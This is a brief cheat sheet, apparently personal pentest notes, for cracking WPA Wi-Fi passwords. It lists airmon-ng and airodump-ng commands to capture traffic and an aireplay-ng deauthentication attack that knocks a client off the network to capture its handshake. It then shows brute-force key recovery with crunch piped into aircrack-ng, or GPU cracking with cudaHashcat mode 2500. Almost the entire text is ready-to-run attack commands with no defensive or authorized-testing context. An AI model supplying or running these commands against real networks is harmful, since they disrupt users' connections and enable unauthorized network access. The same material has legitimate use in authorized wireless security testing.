# Cracking WPA

Start wireless interface in monitor mode

	airmon-ng check kill
	airmon-ng start wlan0
	airodump-ng --encrypt wpa wlan0mon

Start capturing packets

	airodump-ng -c 2 -w capture --bssid 00:11:22:33:44:55 wlan0mon

Deauthenticate a client

	aireplay-ng -0 5 -a 00:11:22:33:44:55 -c {STATION} wlan0mon

Verify 4-way Handshake

	pyrit -r example.pcap analyze



## Crunch

Cracking with no wordlists

	crunch 10 10 -t %%%%%%%%%% 1234567890 | aircrack-ng -w - capture-01.cap -e WIFINAME

## Hashcat

Strip pcap junk. Beware this could break your pcap file.

	pyrit -r example.pcap -o OUTPUT.pcap strip

Make a friendly Hashcat file. This will convert pcap into a hccap file.

	aircrack-ng OUTPUT.pcap -J example.hccap

Hashing with GPU. Watercooling would be nice.

	cd /usr/share/cudaHashcat
	./cudahashcat64.bin -m 2500 -a 3 example.hccap --gpu-accel=160 --gpu-loops=1024 -1?d ?1?1?1?1?1?1?1?1?1?1

